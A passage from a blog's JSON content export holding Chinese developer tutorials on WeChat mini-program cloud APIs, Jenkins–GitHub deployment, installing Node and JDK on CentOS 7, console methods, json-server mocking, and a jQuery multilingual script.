console.error,&#125;); 小程序端存储文档 服务端1234567891011const app = require('tcb-admin-node');app.init();app.uploadFile(&#123; cloudPath: \"cover.png\", fileContent: fs.createReadStream(`$&#123;__dirname&#125;/cover.png`)&#125;).then((res) =&gt; &#123; console.log(res);&#125;).catch((err) =&gt; &#123; console.error(err);&#125;);; 控制台上传好的文件，就会出现在控制台中，如下图。你可以在控制台里删除、下载或者查看图片的详情。你还可以控文件整体的权限，这里还有一些具体的介绍。 服务端存储文档 数据库小程序云提供文档型数据库 ( document-oriented database )，数据库包含多个集合（相当于关系型数据中的表），集合近似于一个 JSON 数组，数组中的每个对象就是一条记录，记录的格式是 JSON 文档。 每条记录都有一个 _id 字段用以唯一标志这条记录、一个 _openid 字段用以标志记录的创建者，即小程序的用户。开发者可以自定义 _id，但不可在小程序端自定义（在服务端可以） _openid 。_openid 是在文档创建时由系统根据小程序用户默认创建的，开发者可使用其来标识和定位文档。 数据库 API 分为小程序端和服务端两部分，小程序端 API 拥有严格的调用权限控制，开发者可在小程序内直接调用 API 进行非敏感数据的操作。对于有更高安全要求的数据，可在云函数内通过服务端 API 进行操作。云函数的环境是与客户端完全隔离的，在云函数上可以私密且安全的操作数据库。 数据库 API 包含增删改查的能力，使用 API 操作数据库只需三步：获取数据库引用、构造查询/更新条件、发出请求。切记，在操作数据库前，请先在控制台中创建 collection。 小程序端1234567891011121314151617181920212223const db = wx.cloud.database();// 插入数据db.collection('photo').add(&#123; data: &#123; photo: 'cloud://tcb-xxx/05ca1d38f86f90d66d4751a730379dfa6584dde05ab4-Ma9vMN_fw658.jpg', title: '风景' &#125;&#125;);// 提取数据db.collection('photo').get().then((res) =&gt; &#123; let data = res.data; console.log(data);&#125;);// 输出// 在小程序端， _openid 会自动插入到数据库中&#123; photo: 'cloud://tcb-xxx/05ca1d38f86f90d66d4751a730379dfa6584dde05ab4-Ma9vMN_fw658.jpg', title: '风景', _openid: 'oLlMr5FICCQJV-QgVLVzKu1212341'&#125; 小程序端数据库文档 服务端123456789101112131415161718192021222324252627const app = require('tcb-admin-node');app.init();const db = app.database();db.collection('photo').limit(10).get().then((res) =&gt; &#123; console.log(res);&#125;).catch((err) =&gt; &#123; console.error(err);&#125;);// 输出// 因为是在服务端，其它用户的也可以提取出来&#123; photo: 'cloud://tcb-xxx/05ca1d38f86f90d66d4751a730379dfa6584dde05ab4-Ma9vMN_fw658.jpg', title: '风景', _openid: 'oLlMr5FICCQJV-QgVLVzKu1342121'&#125;&#123; photo: 'cloud://tcb-xxx/0dc3e66fd6b53641e328e091ccb3b9c4e53874232e6bf-ZxSfee_fw658.jpg', title: '美女', _openid: 'DFDFEX343xxdf-QgVLVzKu12452121'&#125;&#123; photo: 'cloud://tcb-xxx/104b27e339bdc93c0da15a47aa546b6e9c0e3359c315-L8Px2Y_fw658.jpg', title: '动物', _openid: 'DFDFEX343xxdf-QgVLVzKu1342121'&#125; 服务端数据库文档 控制台可以在控制台里，看到用户操作的数据，你也可以自己在控制台上添加、更新或删除数据。 如果数据量庞大，可以设置索引提供查询的效率。 数据库也可以通过设置权限，管控每个 collection。 云函数云函数是一段运行在云端的代码，无需管理服务器，在开发工具内一键上传部署即可运行后端代码。 开发者可以在云函数内获取到每次调用的上下文（appid、openid 等），无需维护复杂的鉴权机制，即可获取天然可信任的用户登录态（openid）。 小程序端1234567891011wx.cloud.callFunction(&#123; name: 'addblog', // 云函数名称 data: &#123; // 传到云函数处理的参数 title: '云开发 TCB', content: '存储、数据库存、云函数' &#125;&#125;).then(res =&gt; &#123; console.log(res)&#125;).catch((err) =&gt; &#123; console.error(err);&#125;); 小程序端云函数文档 服务端1234567891011121314const app = require(\"tcb-admin-node\");app.init();app.callFunction(&#123; name: 'addblog', // 云函数名称 data: &#123; // 传到云函数处理的参数 title: '云开发 TCB', content: '存储、数据库存、云函数' &#125;&#125;).then((res) =&gt; &#123; console.log(res);&#125;).catch((err) =&gt; &#123; console.error(err);&#125;); 服务端云函数文档 控制台上传好之后的云函数，都会在这里罗列出来。 每次调用云函数，都可以在这里看到日志，还可以构造测试的参数，用于调试。 语法糖大部份的接口，目前都支持两种写法，分别是Promise 和 Async/Await，本节以 callFunction 作为例子，在云函数中介绍这两种写法。 Async/Await 本质上是基于 Promise 的一种语法糖，它只是把 Promise 转换成同步的写法而已。 Promise1234567891011121314151617const app = require(\"tcb-admin-node\");app.init();exports.main = (event, context, callback) =&gt; &#123; app.callFunction(&#123; name: 'addblog', // 云函数名称 data: &#123; // 传到云函数处理的参数 title: '云开发 TCB', content: '存储、数据库存、云函数' &#125; &#125;).then((res) =&gt; &#123; console.log(res); callback(null, res.data); &#125;).catch((err) =&gt; &#123; callback(err); &#125;);&#125;; Async/Await123456789101112131415161718192021const app = require(\"tcb-admin-node\");app.init();exports.main = async (event, context) =&gt; &#123; let result = null; try &#123; result = await app.callFunction(&#123; name: 'addblog', // 云函数名称 data: &#123; // 传到云函数处理的参数 title: '云开发 TCB', content: '存储、数据库存、云函数' &#125; &#125;); &#125; catch (e) &#123; return e; &#125; return result;&#125;; 在云函数里使用，由于是 Node 8.9 或以上的环境，因此天然支持 Async/Await 诘法，但在小程端要使用的话，需要额外引入 Polyfill，比如这个开源的项目：regenerator 开发者资源由于小程序·云开发是基于腾讯云的云开发开发的功能，因此在腾讯云与小程序两边都有不少的开发者资源，这里供大家参阅读： 腾讯云开发者资源及文档 腾讯云云开发平台官方 Github 微信小程序·云开发文档","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"//www.shen.ee/tags/小程序/"},{"name":"云开发","slug":"云开发","permalink":"//www.shen.ee/tags/云开发/"},{"name":"小程序云开发","slug":"小程序云开发","permalink":"//www.shen.ee/tags/小程序云开发/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"Jenkins配合github实现前端项目自动化构建部署","slug":"Jenkins配合github实现前端项目自动化构建部署","date":"2018-09-14T08:46:16.000Z","updated":"2021-11-15T07:55:36.537Z","comments":true,"path":"article/24455.html","link":"","permalink":"//www.shen.ee/article/24455.html","excerpt":"","text":"前言大家以前写前端项目部署，可能都是手动运行命令，打包完，然后压缩，再利用FTP、Xshell等这类的工具上传到服务器解压。也或者你不会操作，你认为这些事情是运维做的，你只需要打包你的前端项目代码后发给运维你就不管了。这种方式确实有点low且效率也不高。 现在大家更关注的是Devops，关注如何来做持续集成，持续交付，如何来做CI/CD。 今天就拿Jenkins配合Github实现自动化集成打包部署。 系列文章： CentOS 7 安装 JAVA环境（JDK 1.8） CentOS 7 安装Node Jenkins的安装这里就不在说明了，网上安装教程很多。 Jenkins介绍引用百度百科的一句话：Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。 在工作中部署jenkins的最大好处就是每次在开发、测试环境代码，都无须运维部署，而是相关的开发人员，测试人员登录jenkins构建需要部署的tag或者分支即可，整个部署过程无须运维参与，解放运维劳动力。 也不用担心部署在多个服务器，在家写代码也不用远程公司部署项目，提交代码后会自动为你部署。 部署方式jenkins的构建方式常用分为三种。 jenkins触发式构建：push代码或者合并代码到项目的master或者其他分支，jenkins就部署代码到对应服务器。 jenkins参数化构建：push代码或者合并代码到项目的master或者其他分支之后，并不会部署代码，而是需要登录到jenkins的web界面，点击构建按钮，传入对应的参数（比如参数需要构建的tag，需要部署的分支）然后才会部署。 jenkins定时构建：多用于APP、自动化用例等自动打包，定时构建是在参数化构建的基础上添加的，开发人员可以登录jenkins手动传入tag进行打包，如果不手动打包，那么jenkins就定时从配置项目地址拉取最新的代码打包。 Jenkins + github持续集成创建 github AccessToken进入github 设置页，选择Developer settings 选择 Personal access tokens -&gt; Generate new token 勾选如下配置 然后点生成就行了，切记一定要保存好这个token，只显示一次。 配置Jenkins进入系统管理 =&gt; 管理插件 =&gt; 安装插件 Github Plugin 然后进入 系统管理 =&gt; 系统设置 =&gt; Github Server 添加信息 Credentials 那里再点击 Add 添加如下信息 添加完毕之后记得选择我们刚刚添加的信息 最后点击 Test Connection 如果配置正确应当有如下显示： 创建任务创建一个自由风格的任务 勾选 Github Project 填入github仓库url 源码管理选择Git ，填写仓库git地址，选择需要构建的分支，我这里选择master （** 为选择所有分支） 构建触发器，这里你们可以根据上面所说的部署方式来选择，这里我选择 GitHub hook trigger for GITScm polling ，来完成 push 后自动构建 然后就是构建 =&gt; 增加构建步骤 =&gt; 执行shell 填入你自己的构建和部署的命令 我这里拿我的hexo博客举例 现在如果提交代码到对应的分支，就会自动触发构建，如果构建成功，也就自动部署在你的网站上了。其实这里就是咱们配置生效了，github监听到咱们push后，利用webhook通知Jenkins：大爷来玩呀，Jenkins就会根据咱们的配置自动完成构建部署。 总结配置看似很繁琐，其实很简单，配置过一次，再配置第二次就是手到擒来，其他项目也是如此，如 vue +webpack类的，只是构建的shell命令不一样而已。 还有，切记 rm -rf慎用慎用！233… o(╥﹏╥)o","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"CentOS 7 安装Node","slug":"CentOS 7 安装Node","date":"2018-09-14T08:44:30.000Z","updated":"2021-11-15T07:55:36.536Z","comments":true,"path":"article/63505.html","link":"","permalink":"//www.shen.ee/article/63505.html","excerpt":"","text":"​ 推荐二进制文件安装，源码安装编译浪费时间且麻烦。 安装官方下载地址：https://nodejs.org/en/download/ 我这里还是选择Linux 64位版本，你们可以根据自己需求选择。 wget下载 1wget https://nodejs.org/dist/v8.12.0/node-v8.12.0-linux-x64.tar.xz 下载成功后，可以通过ls命令查看 因为下载来的文件是.xz方式压缩的，不能直接使用linux命令tar解压，我们先使用xz命令解压 12xz -d node-v8.12.0-linux-x64.tar.xztar -xf node-v8.12.0-linux-x64.tar 配置要想node能够在全局能够使用，需要添加软连接，在控制台输入下面命令能够实现。 安装完node.js后，对应的npm也就下载安装完成了。 12ln -s /root/node-v8.12.0/bin/node /usr/local/bin/node ln -s /root/node-v8.12.0/bin/npm /usr/local/bin/npm 其中/root/node-v8.12.0/bin/node为二进制nodejs文件的目录，根据上面的步骤，我这里是直接解压到了root目录下，所以路径为/root/node-v8.12.0/bin/node。 配置完成后即可在任何目录下使用node 安装淘宝镜像众所周知，默认的官方源对于大陆用户来说下载非常慢，但是有一些国内镜像很不错，这里拿淘宝的举例。 1npm config set registry https://registry.npm.taobao.org 设置前后","categories":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}],"tags":[],"keywords":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}]},{"title":"CentOS 7 安装 JAVA环境（JDK 1.8）","slug":"CentOS 7 安装 JAVA环境（JDK 1.8）","date":"2018-09-14T08:44:00.000Z","updated":"2021-11-15T07:55:36.536Z","comments":true,"path":"article/17343.html","link":"","permalink":"//www.shen.ee/article/17343.html","excerpt":"","text":"下载地址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 记得先勾选接受协议，这里我选择的是：Linux 64位版本，你们可以根据自己需求选择。 值得注意的是下载这里有个鉴权，如果你是直接右键复制下载链接在服务器执行操作，那么可能就几KB而已。这里直接打开浏览器开发者工具取到带有授权的下载链接。 wget下载 1wget http://download.oracle.com/otn-pub/java/jdk/8u181-b13/96a7b8442fe848ef90c96a2fad6ed6d1/jdk-8u181-linux-x64.tar.gz?AuthParam=1536829373_c54140ac09c837c2b3b95dbcb032e4bb 下载以后通过命令检查安装包大小是否符合 1ls -lht 安装创建安装目录 1mkdir /usr/local/java/ 解压至安装目 1tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/java/ 设置环境变量vim使用操作参考：https://blog.csdn.net/zhongqi2513/article/details/67636094 打开文件 1vim /etc/profile 在末尾添加 1234export JAVA_HOME=/usr/local/java/jdk1.8.0_171export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 使环境变量生效 1source /etc/profile 添加软链接 1ln -s /usr/local/java/jdk1.8.0_171/bin/java /usr/bin/java 检查 1java -version","categories":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}],"tags":[],"keywords":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}]},{"title":"你不知道的console.log","slug":"你不知道的console.log","date":"2018-08-24T15:54:10.000Z","updated":"2021-11-15T07:55:36.542Z","comments":true,"path":"article/28709.html","link":"","permalink":"//www.shen.ee/article/28709.html","excerpt":"","text":"前言对于前端开发者，使用console.log() 次数绝对很多，但是大部分人认识的 console 对象还不是很全面，其实深入了解这些后，你会发现给开发过程带来很多便利，而且还很有趣。先来看看别人的控制台。 天猫(还加入了字符画) 百度(这个大家都不陌生，最近还稍微有点改变) 再来看下我博客的 是不是感觉你之前用的console.log()弱爆了，别着急往下看。 重新认识 console你好我是console，重新认识一下吧。正在阅读这篇文章的你，F12打开你的控制台，切到Console输入console输出看看这个对象 是不是惊呆了，除了常用的 log 方法还有这么多方法。 console.log() 输出普通信息console.info() 输出提示信息console.error() 输出错误信息console.warn() 输出警告信息 上面这些就不演示了。 console.dir() 显示对象的所有的属性和方法 12345678var obj = &#123; str: 'youhun', num: 1, func: function()&#123; console.log('a') &#125;&#125;;console.dir(obj); console.tabel() 传入对象/数组，以表格形式输出 123456789101112131415161718var obj = &#123; foo: &#123; name: 'foo', age: '33' &#125;, bar: &#123; name: 'bar', age: '45' &#125;&#125;;var arr = [ ['foo', '33'], ['bar', '45']];console.table(obj);console.table(arr); console.time() 计时器，可以将成对的console.time()和console.timeEnd()之间代码的运行时间输出到控制台上 12345console.time('计时器');for (var i = 0; i &lt; 1000; i++) &#123; for (var j = 0; j &lt; 1000; j++) &#123;&#125;&#125;console.timeEnd('计时器'); console.group() 和 console.groupCollapsed() 输出嵌套，就是分组，同样支持多层嵌套 123456console.group('第一层'); console.log('第一层里面');console.group('第二层'); console.log('第二层里面');console.groupEnd();console.groupEnd(); ps：console.group 默认是展开状态，console.groupCollapsed 默认是收起状态 console.trace() 用来追踪函数的调用轨迹。大型项目中，这尤为重要。 123456789101112131415161718function add(a, b) &#123; console.trace(\"Add function\"); return a + b;&#125;function add3(a, b) &#123; return add2(a, b);&#125;function add2(a, b) &#123; return add1(a, b);&#125;function add1(a, b) &#123; return add(a, b);&#125;var x = add3(1, 1); console.count() 输出执行次数 12345(function() &#123; for (var i = 0; i &lt; 5; i++) &#123; console.count('count'); &#125;&#125;)(); console.assert() 条件输出，接收两个参数。第一个参数为真时，不输出内容，否则显示，并抛出来一个异常。 12console.assert(1 == 1, '你看不到我');console.assert(1 == 2, '你看到我了'); console.log 的高级玩法这个为什么单独拿出来说，正是因为这个玩法多样。会了，你可以像文章开头举例那些，做出自己喜欢的console.log 占位符 %s 格式化成字符串输出 %d or %i 格式化成整数输出 %f 格式化成浮点数输出 %o 转化成展开的DOM元素输出 %O 转化成JavaScript对象输出 %c 字符串增加样式输出 1234567891011var arr = [\"小明\", \"小红\"];var obj = &#123;name:'youhun'&#125;console.log(\"欢迎%s和%s两位新同学\",arr[0],arr[1]);console.log(\"圆周率整数部分：%d，带上小数是：%f\",3.1415,3.1415);console.log('%o', obj);console.log('%O', obj); 再来试试 %c 来点样式 12345console.log('%c我的背景是红色', 'color: #fff; background: red; font-size: 24px;'); console.log(\"%c3D Text\", \" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em\");console.log('%cYouhun', 'background-image:-webkit-gradient( linear, left top, right top, color-stop(0, #f22), color-stop(0.15, #f2f), color-stop(0.3, #22f), color-stop(0.45, #2ff), color-stop(0.6, #2f2),color-stop(0.75, #2f2), color-stop(0.9, #ff2), color-stop(1, #f22) );color:transparent;-webkit-background-clip: text;font-size:5em;'); 参考链接 https://developer.mozilla.org/en-US/docs/Web/API/console http://www.ruanyifeng.com/blog/2011/03/firebug_console_tutorial.html","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"json-server进阶","slug":"json-server高级","date":"2018-07-20T02:20:37.000Z","updated":"2021-11-15T07:55:36.540Z","comments":true,"path":"article/30338.html","link":"","permalink":"//www.shen.ee/article/30338.html","excerpt":"","text":"​ 上一篇文章详细介绍了下json-server的基础使用，完成了简单的增删改查操作，但是如果有时候我们需要大量并且合理的数据，之前的操作似乎就很鸡肋了，或者亦又想自定义api访问地址等等。那么这篇文章正是你所需要的。 动态数据使用js动态生成数据创建db.js文件 12345678module.exports = function() &#123; let data = &#123; list: [] &#125; // Create 1000 datas for (let i = 0; i &lt; 1000; i++) &#123; data.list.push(&#123; id: i, name: 'user' + i,link:'www.'+ i + '.com' &#125;) &#125; return data&#125; 在该目录下执行 1json-server db.js 现在访问http://localhost:3000/list会看到动态生成了1000条数据，这跟咱们手动在json文件里写1000条数据效果一样，但肯定没有这么方便。还好json-server支持使用js动态生成的json格式数据。 Mockjs生成数据虽然我们使用js动态生成了一些数据，但是这似乎不太符合常理。既然要模拟，那我们就模拟一些比较合理的数据，这里推荐使用Mockjs一款很好的数据模拟第三方库。 上篇文章我留下了一个思考：mockjs是可以作为一个独立的mock server存在，但为什么不单独用它？ 不能跨域使用 与某些框架中的路由处理逻辑冲突 无法定义复杂的数据结构 无法自定义较为复杂的路由 其实数据生成器有很多，在这里必须提一下faker，几乎支持全部常用的数据格式，而且还有多语言，但是正如网上很多人所说那样，他的中文数据是以西方文字为基础，并不能很好的模拟中文 。 比如我随机生成一个用户信息（城市、街道、公司、月份、邮箱、电话）： 可以明显看到通过faker生成的数据可读性真的很差，再来看下mockjs 12345678910let Mock = require('mockjs');let Random = Mock.Random;console.log(Random.city()); console.log(Random.cname()); console.log(Random.date()); console.log(Mock.mock(&#123; \"stars|1-10\": \"★\"&#125;));console.log(Random.image('200x100', '#4A7BF7', 'hello')) 可以看到这次生成数据可读性很好，而且图片的提供商还是国内的（不用爬梯子访问了） 生成真实合理的数据 在你db.js文件所在目录下安装mockjs 1npm install mockjs --save 在这里不重复说mockjs的使用方法，文档都有。mockjs官网：http://mockjs.com/ 改造下db.js 12345678910let Mock = require('mockjs');let Random = Mock.Random;module.exports = function() &#123; let data = &#123; list: [] &#125; // Create 1000 datas for (let i = 0; i &lt; 1000; i++) &#123; data.list.push(&#123; id: i, name: Random.cname(),link:Random.url() &#125;) &#125; return data&#125; 可以看到这次生成的数据 配置项上篇文章列过json-server的配置项，再看下。 123456789101112131415161718json-server [options] &lt;source&gt;Options: --config, -c 指定 config 文件 [默认: \"json-server.json\"] --port, -p 设置端口号 [default: 3000] --host, -H 设置主机 [默认: \"0.0.0.0\"] --watch, -w 监控文件 [boolean] --routes, -r 指定路由文件 --static, -s 设置静态文件 --read-only, --ro 只允许 GET 请求 [boolean] --no-cors, --nc 禁止跨域资源共享 [boolean] --no-gzip, --ng 禁止GZIP [boolean] --snapshots, -S 设置快照目录 [默认: \".\"] --delay, -d 设置反馈延时 (ms) --id, -i 设置数据的id属性 (e.g. _id) [默认: \"id\"] --quiet, -q 不输出日志信息 [boolean] --help, -h 显示帮助信息 [boolean] --version, -v 显示版本号 [boolean] 直接在命令行配置，例如 1json-server db.js -d 500 -q -r ./routes.json 也可以创建json-server.json文件进行配置 123456&#123; \"watch\": true, \"delay\": 500, \"quiet\": true, \"routes\": \"./routes.json\"&#125; 然后直接运行 1json-server db.js 当然也可以使用npm启动 自定义路由自定义路由通俗的讲就是给api请求地址起了个别名，而且和后台商量好后就避免后期了修改接口地址的麻烦。 在mock目录下创建router.json文件，注意每个路由文件应该以/开头。 12345&#123; \"/api\": \"/list\", \"/api/list/:id\": \"/list/:id\", \"/api/users?name=:name\":\"/users?name=:name\"&#125; 在这个json文件里key就是真实部署时要访问的api路径，对应的value就是我们开发时虚拟的api路径。现在访问 /api/list/1和访问/list/1 都返回/list/1的内容 高级查找Filter(过滤)使用.操作 对象属性值，比如访问更深层次的属性 12GET /list?name.length=2&amp;id=888GET /list?name.age=18 Paginate(分页)使用 _page 和可选的 _limit来对返回数据定制（不设置默认返回10条）。在返回的Response Headers 中，有一个属性Link，里面会有first, prev, next and last links。 而且还有X-Total-Count 12GET /list?name.length=2&amp;id=888GET /list?name.age=18 Sort(排序)使用 _sort 和 _order （默认是ascending) 1GET /list?_sort=id&amp;_order=asc 对于多字段的排序， 可以这样 1GET /list?_sort=id,name.length&amp;_order=desc,asc Slice(分隔)使用 _start 和 _end 或者 _limit 12GET /list?_start=2&amp;_end=5GET /list?_start=10&amp;_limit=5 Operators(运算)使用 _gte 或 _lte 选取一个范围 12# 选取id在2-5之间的数据GET /list?id_gte=2&amp;id_lte=5 使用 _ne 排除一个值 1GET /list?name_ne=游魂 使用 _like 进行模糊查找 (支持正则表达式) 1GET /list?name_like=游魂 Full-text search(全文检索)使用 q，在对象全部value中遍历查找包含指定值的数据 1GET /list?q=张 Relationships(关系图谱)获取包含下级资源的数据, 使用 _embed 1GET /parents?_embed=children 获取包含上级资源的数据, 使用 _expand 1GET /children?_expand=parents 还有很多没说到，但是这些已经足够用了。 json-server官网：https://github.com/typicode/json-server","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"使用 json-server 简单完成CRUD模拟后台数据","slug":"json-server基础使用","date":"2018-07-09T03:50:40.000Z","updated":"2021-11-15T07:55:36.540Z","comments":true,"path":"article/30720.html","link":"","permalink":"//www.shen.ee/article/30720.html","excerpt":"","text":"在开发中，后端的接口往往是较晚出来的，但是有时候我们必须给前端页面一些虚假的数据去开发，这个时候一些mock工具就很有必要了，最终我选择了json server工具，因为它足够简单，而且也能和你们所熟知的Mock.js 配合模拟数据（思考：mockjs是可以作为一个独立的mock server存在，但为什么不单独用它？）。 安装1npm install json-server -g 安装完成后可以用 json-server -h 命令检查是否安装成功。 123456789101112131415161718json-server [options] &lt;source&gt;Options: --config, -c 指定 config 文件 [默认: \"json-server.json\"] --port, -p 设置端口号 [default: 3000] --host, -H 设置主机 [默认: \"0.0.0.0\"] --watch, -w 监控文件 [boolean] --routes, -r 指定路由文件 --static, -s 设置静态文件 --read-only, --ro 只允许 GET 请求 [boolean] --no-cors, --nc 禁止跨域资源共享 [boolean] --no-gzip, --ng 禁止GZIP [boolean] --snapshots, -S 设置快照目录 [默认: \".\"] --delay, -d 设置反馈延时 (ms) --id, -i 设置数据的id属性 (e.g. _id) [默认: \"id\"] --quiet, -q 不输出日志信息 [boolean] --help, -h 显示帮助信息 [boolean] --version, -v 显示版本号 [boolean] 使用创建个Mock目录，在该目录下创建一个json文件，db.json 123456789101112131415161718192021222324252627282930313233&#123; \"list\": [ &#123; \"name\": \"游魂博客\", \"link\": \"www.iyouhun.com\", \"id\": 1 &#125;, &#123; \"id\": 2, \"name\": \"买卖淘\", \"link\": \"www.868432.net\" &#125;, &#123; \"id\": 3, \"name\": \"游魂全自动网页制作系统\", \"link\": \"www.youhun.wang\" &#125;, &#123; \"id\": 4, \"name\": \"游魂博客\", \"link\": \"www.iyouhun.com\" &#125;, &#123; \"id\": 5, \"name\": \"买卖淘\", \"link\": \"www.868432.net\" &#125;, &#123; \"id\": 6, \"name\": \"游魂全自动网页制作系统\", \"link\": \"www.youhun.wang\" &#125;]&#125; 在Mock目录下执行 1json-server db.json 打开浏览器，http://localhost:3000,查看页面。可以试着直接访问他索引出来的资源如果要监控json文件的变化，启动的时候加上参数--watch 或者 -w。 支持的方法你可以使用任何 HTTP method 如： GET /list 获取列表 GET /list/1 获取id=1的数据 POST /list 创建一个项目 PUT /list/1 更新一个id为1的数据 PATCH /list/1 部分更新id为1的数据 DELETE /list/1 删除id为1的数据 注意： 当你发送POST，PUT，PATCH 或者 DELETE请求时，变化会自动安全的保存到你的db.json文件中。 你的请求体body应该是封闭对象。比如{&quot;name&quot;: &quot;Foobar&quot;} id不是必须的，在PUT或者PATCH方法中，任何的id值将会被忽略。 在POST请求中，id是可以被添加的，如果该值没有没占用，会使用该值，否则自动生成。 POST，PUT或者PATCH请求应该包含一个Content-Type:application/json的header，来确保在请求body中使用json。 操作数据这里请求数据我全部使用postman工具，最后一条删除我使用jquer的$.ajax 举例 查询GET请求：http://localhost:3000/list 新增POST请求：http://localhost:3000/list 参数：{“name”:”游魂博客”,”link”:”www.iyouhun.com”} 请求成功后会看到返回的就是新增成功的链接信息 修改PUT请求：http://localhost:3000/list/1 修改id为1的友链信息 参数：{“name”:”哈哈哈哈哈客”,”link”:”www”} 删除DELETE请求：http://localhost:3000/list/1 删除id为1的友链信息 1234567$.ajax(&#123; type: 'DELETE', url: 'http://localhost:3000/list/1', success: function (data) &#123; console.log(data) &#125;&#125;)","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"so easy 前端实现多语言","slug":"so easy 前端实现多语言","date":"2018-05-17T08:37:05.000Z","updated":"2021-11-15T07:55:36.541Z","comments":true,"path":"article/25439.html","link":"","permalink":"//www.shen.ee/article/25439.html","excerpt":"","text":"​ 每个公司业务不一样，此解决方案仅做参考 。 Git demo地址 更新(2018-07-17)默认当前系统设置语言;考虑到一些表单输入框placeholder也有中文，加lang-input翻译。 前言其实现在开发者解决多语言普遍三种解决方案： 第一个是为每个页面提供每种语言的相关页面。第二种是把内容从表现形式中分离出来，做不同语言的内容文件。第三种是动态翻译页面内容。第三种很少见，而且机器翻译技术还很难达到人们的预期。 其实第二种相对来说简单一点，那么开搞。 实现思考 翻译公司给的有的excel有的是json文件，咱们就统一请求json文件吧; html中给标签加个lang属性，到时候页面加载时遍历所有这些有lang属性的标签去实现切换语言; js里的文字用方法实现转换语言; 把用户选择的语言存到cookie里吧，嗯！拿个小本本记下来; 做个缓存，请求过的语言文件就不再请求了; 暂时就这些吧… demo 文件目录 index.html 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta charset=\"utf-8\"&gt; &lt;title&gt;translation test&lt;/title&gt; &lt;script src=\"https://cdn.bootcss.com/jquery/1.11.0/jquery.min.js\"&gt;&lt;/script&gt;&lt;script src=\"js/script.js\"&gt;&lt;/script&gt; &lt;script src=\"js/index.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;a href=\"#\" id=\"enBtn\"&gt;English&lt;/a&gt; &lt;a href=\"#\" id=\"zhBtn\"&gt;简体中文&lt;/a&gt; &lt;/div&gt; &lt;div&gt;&lt;a lang&gt;click here:&lt;/a&gt;&lt;/div&gt; &lt;div&gt;&lt;input type=\"button\" value=\"apply\" lang id=\"applyBtn\"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; script.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107var dict = &#123;&#125;;var systemLang = navigator.language.toLowerCase().slice(0,2);$(function () &#123; registerWords(); if(getCookieVal(\"lang\")==\"en\")&#123; setLanguage(\"en\"); &#125;else if(getCookieVal(\"lang\")==\"zh\")&#123; setLanguage(\"zh\"); &#125;else&#123; setLanguage(systemLang); &#125; // 切换语言事件 根据自己业务而定 $(\"#enBtn\").bind(\"click\", function () &#123; setLanguage(\"en\"); //这里也可以写一些其他操作，比如加载语言对应的css &#125;); $(\"#zhBtn\").bind(\"click\", function () &#123; setLanguage(\"zh\"); &#125;);&#125;);function setLanguage(lang) &#123; setCookie(\"lang=\" + lang + \"; path=/;\"); translate(lang);&#125;function getCookieVal(name) &#123; var items = document.cookie.split(\";\"); for (var i in items) &#123; var cookie = $.trim(items[i]); var eqIdx = cookie.indexOf(\"=\"); var key = cookie.substring(0, eqIdx); if (name == $.trim(key)) &#123; return $.trim(cookie.substring(eqIdx + 1)); &#125; &#125; return null;&#125;function setCookie(cookie) &#123; var Days = 30; //此 cookie 将被保存 30 天 var exp = new Date(); //new Date(\"December 31, 9998\"); exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000); document.cookie = cookie+ \";expires=\" + exp.toGMTString();&#125;function translate(lang) &#123; if(sessionStorage.getItem(lang + \"Data\") != null)&#123; dict = JSON.parse(sessionStorage.getItem(lang + \"Data\")); &#125;else&#123; loadDict(); &#125; $(\"[lang]\").each(function () &#123; switch (this.tagName.toLowerCase()) &#123; case \"input\": $(this).val(__tr($(this).attr(\"lang\"))); break; default: $(this).text(__tr($(this).attr(\"lang\"))); &#125; &#125;); $(\"[lang-input]\").each(function () &#123; $(this).attr(\"placeholder\", __tr($(this).attr(\"lang-input\"))); &#125;);&#125;function __tr(src) &#123; return (dict[src] || src);&#125;function loadDict() &#123; var lang = (getCookieVal(\"lang\") || \"en\"); $.ajax(&#123; async: false, type: \"GET\", url: \"/lang/\"+lang + \".json\", success: function (msg) &#123; dict = msg; sessionStorage.setItem(lang + 'Data', JSON.stringify(dict)); &#125; &#125;);&#125;// 